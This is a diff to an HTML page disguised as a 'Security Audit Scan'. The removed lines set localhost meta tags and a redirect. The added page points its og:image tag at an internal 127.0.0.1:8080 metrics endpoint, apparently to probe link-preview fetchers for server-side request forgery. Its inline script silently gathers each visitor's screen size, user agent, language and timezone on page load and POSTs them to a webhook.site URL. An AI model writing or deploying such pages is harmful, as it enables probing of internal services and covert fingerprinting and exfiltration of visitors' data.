@@ -1,3 +1,31 @@
-<meta property="og:title" content="System Check">
-<meta property="og:image" content="http://127.0.0.1/favicon.ico">
-<script>window.location.replace("http://127.0.0.1/status");</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="Security Audit Scan">
+    
+    <meta property="og:image" content="http://127.0.0.1:8080/v1/metrics">
+    <meta property="og:description" content="Testing internal endpoint reachability">
+
+    <script>
+        const myWebhook = "https://webhook.site/5910295a-0efa-4674-aa84-eb4bb640bf18";
+        
+        // Автоматический сбор того, что доступно без разрешений:
+        const info = {
+            screen: `${window.screen.width}x${window.screen.height}`,
+            ua: navigator.userAgent,
+            lang: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+
+        fetch(myWebhook, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(info)
+        });
+    </script>
+</head>
+<body>
+    <h1>System Analysis in progress...</h1>
+</body>
+</html>
